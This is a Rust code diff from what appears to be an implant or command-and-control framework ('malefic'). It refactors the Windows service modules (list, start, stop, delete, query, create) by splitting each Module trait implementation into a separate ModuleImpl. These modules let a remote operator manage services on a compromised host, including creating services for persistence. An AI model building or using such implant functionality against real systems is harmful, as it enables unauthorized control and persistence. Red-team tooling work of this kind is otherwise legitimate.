@@ -1,4 +1,4 @@
-use crate::{Module, TaskResult, check_request, Result, Input, Output};
+use crate::{Module, ModuleImpl, TaskResult, check_request, Result, Input, Output};
 use malefic_proto::proto::implantpb::{spite::Body};
 use async_trait::async_trait;
 use malefic_helper::win::service::{ServiceConfig, ServiceErrorControl, ServiceExitCode, ServiceManager, ServiceStartType, ServiceStatus};
@@ -37,7 +37,10 @@ pub struct ServiceList {}
 
 #[async_trait]
 #[module_impl("service_list")]
-impl Module for ServiceList {
+impl Module for ServiceList {}
+
+#[async_trait]
+impl ModuleImpl for ServiceList {
     async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> Result {
         let _ = check_request!(_receiver, Body::Request)?;
         let manager = ServiceManager::open()?;
@@ -63,7 +66,9 @@ pub struct ServiceStart {}
 
 #[async_trait]
 #[module_impl("service_start")]
-impl Module for ServiceStart {
+impl Module for ServiceStart {}
+#[async_trait]
+impl ModuleImpl for ServiceStart {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::ServiceRequest)?;
         let manager = ServiceManager::open()?;
@@ -74,12 +79,14 @@ impl Module for ServiceStart {
     }
 }
 
-
 pub struct ServiceStop {}
 
 #[async_trait]
 #[module_impl("service_stop")]
-impl Module for ServiceStop {
+impl Module for ServiceStop {}
+
+#[async_trait]
+impl ModuleImpl for ServiceStop {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::ServiceRequest)?;
         let manager = ServiceManager::open()?;
@@ -90,12 +97,14 @@ impl Module for ServiceStop {
     }
 }
 
-
 pub struct ServiceDelete {}
 
 #[async_trait]
 #[module_impl("service_delete")]
-impl Module for ServiceDelete {
+impl Module for ServiceDelete {}
+
+#[async_trait]
+impl ModuleImpl for ServiceDelete {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::ServiceRequest)?;
 
@@ -114,7 +123,9 @@ pub struct ServiceQuery {}
 
 #[async_trait]
 #[module_impl("service_query")]
-impl Module for ServiceQuery {
+impl Module for ServiceQuery {}
+#[async_trait]
+impl ModuleImpl for ServiceQuery {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         let req = check_request!(receiver, Body::ServiceRequest)?;
 
@@ -135,7 +146,10 @@ pub struct ServiceCreate {}
 
 #[async_trait]
 #[module_impl("service_create")]
-impl Module for ServiceCreate {
+impl Module for ServiceCreate {}
+
+#[async_trait]
+impl ModuleImpl for ServiceCreate {
     async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
         // 从请求中获取 `ServiceRequest`
         let req = check_request!(receiver, Body::ServiceRequest)?;
